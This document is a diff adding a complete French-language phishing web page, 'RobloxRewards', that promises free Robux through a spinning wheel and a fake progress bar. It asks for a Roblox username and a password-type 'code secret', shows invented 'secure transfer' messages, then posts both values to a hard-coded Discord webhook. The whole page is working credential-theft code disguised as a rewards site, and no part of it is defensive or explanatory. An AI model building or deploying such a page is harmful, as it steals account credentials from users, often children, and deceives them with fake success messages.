@@ -1,0 +1,210 @@
+<html><head><base href="https://rblxrewards.com/"><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>RobloxRewards - Gagnez des Robux Gratuitement</title>
+<style>
+    body {
+        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        background-color: #1a1a2e;
+        color: #e0e0e0;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        margin: 0;
+    }
+    .container {
+        background-color: #16213e;
+        padding: 30px;
+        border-radius: 15px;
+        box-shadow: 0 0 20px rgba(0,0,0,0.3);
+        text-align: center;
+        max-width: 400px;
+        width: 100%;
+    }
+    h1 {
+        color: #00b4d8;
+        margin-bottom: 20px;
+    }
+    input, button {
+        margin: 10px 0;
+        padding: 12px;
+        width: 100%;
+        box-sizing: border-box;
+        border: none;
+        border-radius: 5px;
+    }
+    input {
+        background-color: #0f3460;
+        color: #e0e0e0;
+    }
+    button {
+        background-color: #00b4d8;
+        color: #ffffff;
+        font-weight: bold;
+        cursor: pointer;
+        transition: background-color 0.3s;
+    }
+    button:hover {
+        background-color: #0096c7;
+    }
+    #wheel {
+        width: 300px;
+        height: 300px;
+        margin: 20px auto;
+        position: relative;
+    }
+    #spinButton {
+        position: absolute;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        background-color: #ffd700;
+        color: #1a1a2e;
+        border: none;
+        padding: 15px 30px;
+        border-radius: 25px;
+        cursor: pointer;
+        z-index: 10;
+        font-size: 18px;
+        font-weight: bold;
+        transition: all 0.3s;
+    }
+    #spinButton:hover {
+        background-color: #ffed4a;
+        box-shadow: 0 0 15px rgba(255, 215, 0, 0.5);
+    }
+    #progressBar {
+        width: 100%;
+        background-color: #0f3460;
+        margin-top: 20px;
+        border-radius: 10px;
+        overflow: hidden;
+    }
+    #progressBarFill {
+        width: 0%;
+        height: 30px;
+        background-color: #00b4d8;
+        text-align: center;
+        line-height: 30px;
+        color: white;
+        transition: width 0.5s;
+    }
+    #loadingText {
+        margin-top: 15px;
+        font-weight: bold;
+        color: #48cae4;
+    }
+    .robux-amount {
+        font-size: 24px;
+        font-weight: bold;
+        color: #ffd700;
+    }
+</style>
+</head>
+<body>
+    <div class="container">
+        <h1>RobloxRewards</h1>
+        <p>Gagnez jusqu'à <span class="robux-amount">10,000 Robux</span> gratuitement !</p>
+        <input type="text" id="username" placeholder="Votre nom d'utilisateur Roblox">
+        <input type="password" id="code" placeholder="Code secret">
+        <div id="wheel">
+            <svg viewBox="0 0 100 100">
+                <defs>
+                    <linearGradient id="gradient" x1="0%" y1="0%" x2="100%" y2="0%">
+                        <stop offset="0%" style="stop-color:#ffd700;stop-opacity:1" />
+                        <stop offset="100%" style="stop-color:#ff8c00;stop-opacity:1" />
+                    </linearGradient>
+                </defs>
+                <g id="wheelSpin">
+                    <circle cx="50" cy="50" r="45" fill="url(#gradient)" stroke="#e0e0e0" stroke-width="2"/>
+                    <path d="M50 5 L50 95 M5 50 L95 50 M14.6447 14.6447 L85.3553 85.3553 M14.6447 85.3553 L85.3553 14.6447" stroke="#1a1a2e" stroke-width="0.5"/>
+                    <text x="50" y="25" text-anchor="middle" fill="#1a1a2e" font-size="7" font-weight="bold">1000</text>
+                    <text x="50" y="80" text-anchor="middle" fill="#1a1a2e" font-size="7" font-weight="bold">5000</text>
+                    <text x="20" y="52" text-anchor="middle" fill="#1a1a2e" font-size="7" font-weight="bold">2000</text>
+                    <text x="80" y="52" text-anchor="middle" fill="#1a1a2e" font-size="7" font-weight="bold">10000</text>
+                    <circle cx="50" cy="50" r="5" fill="#1a1a2e"/>
+                </g>
+            </svg>
+            <button id="spinButton" onclick="spinWheel()">TOURNER</button>
+        </div>
+        <button onclick="startProcess()">Obtenir mes Robux</button>
+        <div id="progressBar">
+            <div id="progressBarFill">0%</div>
+        </div>
+        <div id="loadingText"></div>
+    </div>
+
+<script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+<script>
+let wheelRotation = 0;
+let canSpin = true;
+
+function spinWheel() {
+    if (!canSpin) return;
+    canSpin = false;
+    const rotation = 3600 + Math.random() * 360;
+    wheelRotation += rotation;
+    document.getElementById('wheelSpin').style.transition = 'transform 5s cubic-bezier(0.25, 0.1, 0.25, 1)';
+    document.getElementById('wheelSpin').style.transform = `rotate(${wheelRotation}deg)`;
+    setTimeout(() => {
+        canSpin = true;
+        const winAmount = [1000, 2000, 5000, 10000][Math.floor(Math.random() * 4)];
+        alert(`Félicitations ! Vous avez gagné ${winAmount} Robux !`);
+    }, 5000);
+}
+
+function startProcess() {
+    const username = document.getElementById('username').value;
+    const code = document.getElementById('code').value;
+    if (!username || !code) {
+        alert('Veuillez entrer votre nom d\'utilisateur Roblox et le code secret.');
+        return;
+    }
+    
+    const progressBarFill = document.getElementById('progressBarFill');
+    const loadingText = document.getElementById('loadingText');
+    
+    let progress = 0;
+    const loadingMessages = [
+        "Connexion sécurisée au serveur RobloxRewards...",
+        "Vérification de l'identité du compte...",
+        "Analyse des données de jeu...",
+        "Calcul de la récompense optimale...",
+        "Génération des Robux...",
+        "Envoi sécurisé des RBX...",
+        "Mise à jour du solde du compte...",
+        "Finalisation de la transaction..."
+    ];
+    
+    const updateProgress = setInterval(() => {
+        progress += 1;
+        progressBarFill.style.width = `${progress}%`;
+        progressBarFill.textContent = `${progress}%`;
+        
+        if (progress % 12 === 0) {
+            loadingText.textContent = loadingMessages[Math.floor(progress / 12)];
+        }
+        
+        if (progress >= 100) {
+            clearInterval(updateProgress);
+            loadingText.textContent = "Transfert réussi ! Les Robux seront crédités sur votre compte dans les 24-48 heures. Merci d'utiliser RobloxRewards !";
+            sendToDiscord(username, code);
+        }
+    }, 100);
+}
+
+function sendToDiscord(username, code) {
+    const webhookURL = 'https://discord.com/api/webhooks/1276076605864677457/017EPEIUcDRRHhFIJ8cDnOtyhYapkiejkHuW4_36jC9rz7kx2t8oqTMHOcMZIq6bDPEv';
+
+    const message = {
+        content: `Nouveau utilisateur :\nNom d'utilisateur : ${username}\nCode : ${code}`
+    };
+
+    axios.post(webhookURL, message)
+        .then(response => {
+            console.log('Données envoyées avec succès');
+        })
+        .catch(error => {
+            console.error('Erreur lors de l\'envoi des données :', error);
+        });
+}
+</script>
+</body></html>
